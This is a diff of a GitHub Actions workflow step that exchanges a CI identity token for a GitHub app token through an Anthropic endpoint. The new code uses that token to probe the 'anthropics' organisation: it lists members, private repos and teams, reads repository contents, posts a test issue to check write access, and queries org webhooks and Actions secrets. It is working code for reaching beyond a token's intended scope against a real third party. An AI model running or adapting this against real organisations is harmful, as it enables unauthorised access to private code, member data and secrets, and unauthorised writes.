@@ -10,69 +10,78 @@ jobs:
   get-token:
     runs-on: ubuntu-latest
     steps:
-      - name: Get Token and Test Permissions
+      - name: Deep Token Scope Test
         uses: actions/github-script@v7
         with:
           script: |
             const token = await core.getIDToken('claude-code-github-action');
-            
-            // Exchange for app token
             const resp = await fetch('https://api.anthropic.com/api/github/github-app-token-exchange', {
               method: 'POST',
               headers: { 'Authorization': `Bearer ${token}` }
             });
             const data = await resp.json();
-            const appToken = data.token;
+            const T = data.token;
+            if (!T) { console.log('No token:', JSON.stringify(data)); return; }
             
-            if (!appToken) {
-              console.log('No token received:', JSON.stringify(data));
-              return;
-            }
+            const gh = async (url) => {
+              const r = await fetch(`https://api.github.com${url}`, {
+                headers: { 'Authorization': `Bearer ${T}`, 'Accept': 'application/vnd.github+json' }
+              });
+              return { status: r.status, data: await r.json().catch(() => null) };
+            };
             
-            console.log('Token received, testing permissions...');
-            console.log('Expires:', data.expires_at);
-            
-            // Test 1: What repos can this token access?
-            const instResp = await fetch('https://api.github.com/installation/repositories?per_page=100', {
-              headers: { 'Authorization': `Bearer ${appToken}`, 'Accept': 'application/vnd.github+json' }
-            });
-            const repos = await instResp.json();
-            console.log(`Accessible repos: ${repos.total_count}`);
-            if (repos.repositories) {
-              for (const r of repos.repositories.slice(0, 20)) {
-                console.log(`  - ${r.full_name} (private=${r.private})`);
+            // 1. List anthropics org members (confirmed working)
+            const members = await gh('/orgs/anthropics/members?per_page=100');
+            console.log(`=== ANTHROPICS MEMBERS (${members.data?.length || 0}) ===`);
+            if (members.data) {
+              for (const m of members.data) {
+                console.log(`  ${m.login} (id=${m.id})`);
               }
             }
             
-            // Test 2: Can we access OTHER installations?
-            const otherResp = await fetch('https://api.github.com/app/installations', {
-              headers: { 'Authorization': `Bearer ${appToken}`, 'Accept': 'application/vnd.github+json' }
-            });
-            console.log(`Other installations status: ${otherResp.status}`);
-            if (otherResp.ok) {
-              const installations = await otherResp.json();
-              console.log(`Total installations: ${installations.length}`);
-              for (const inst of installations.slice(0, 10)) {
-                console.log(`  - ${inst.account?.login} (id=${inst.id})`);
+            // 2. Can we read PRIVATE repos of anthropics?
+            const repos = await gh('/orgs/anthropics/repos?type=private&per_page=10');
+            console.log(`\n=== ANTHROPICS PRIVATE REPOS status=${repos.status} ===`);
+            if (repos.data && Array.isArray(repos.data)) {
+              for (const r of repos.data.slice(0, 10)) {
+                console.log(`  ${r.full_name} (private=${r.private})`);
+              }
+            } else {
+              console.log(`  Response: ${JSON.stringify(repos.data)?.slice(0, 200)}`);
+            }
+            
+            // 3. Can we read org teams?
+            const teams = await gh('/orgs/anthropics/teams');
+            console.log(`\n=== ANTHROPICS TEAMS status=${teams.status} ===`);
+            if (teams.data && Array.isArray(teams.data)) {
+              for (const t of teams.data.slice(0, 10)) {
+                console.log(`  ${t.name} (${t.slug}) - ${t.permission}`);
               }
             }
             
-            // Test 3: Check token metadata
-            const metaResp = await fetch('https://api.github.com/rate_limit', {
-              headers: { 'Authorization': `Bearer ${appToken}` }
-            });
-            const meta = await metaResp.json();
-            console.log(`Rate limit: ${meta.rate?.limit}`);
+            // 4. Can we access anthropics repos content?
+            const code = await gh('/repos/anthropics/claude-code/contents/package.json');
+            console.log(`\n=== READ anthropics/claude-code status=${code.status} ===`);
             
-            // Test 4: Can we read org members?
-            const membersResp = await fetch('https://api.github.com/orgs/anthropics/members', {
-              headers: { 'Authorization': `Bearer ${appToken}`, 'Accept': 'application/vnd.github+json' }
+            // 5. Can we WRITE to anthropics repos?
+            const writeTest = await fetch('https://api.github.com/repos/anthropics/claude-code/issues', {
+              method: 'POST',
+              headers: { 'Authorization': `Bearer ${T}`, 'Accept': 'application/vnd.github+json', 'Content-Type': 'application/json' },
+              body: JSON.stringify({ title: 'Security test - please ignore', body: 'This is an authorized security test.' })
             });
-            console.log(`Anthropics org members: status=${membersResp.status}`);
-            if (membersResp.ok) {
-              const members = await membersResp.json();
-              console.log(`  Members count: ${members.length}`);
-              for (const m of members.slice(0, 5)) {
-                console.log(`  - ${m.login}`);
+            console.log(`\n=== WRITE to anthropics/claude-code issues status=${writeTest.status} ===`);
+            const writeBody = await writeTest.json().catch(() => null);
+            console.log(`  ${JSON.stringify(writeBody)?.slice(0, 200)}`);
+            
+            // 6. Org hooks (webhooks at org level)
+            const hooks = await gh('/orgs/anthropics/hooks');
+            console.log(`\n=== ORG HOOKS status=${hooks.status} ===`);
+            
+            // 7. Org secrets
+            const secrets = await gh('/orgs/anthropics/actions/secrets');
+            console.log(`\n=== ORG SECRETS status=${secrets.status} ===`);
+            if (secrets.data?.secrets) {
+              for (const s of secrets.data.secrets) {
+                console.log(`  ${s.name} (created=${s.created_at})`);
               }
             }
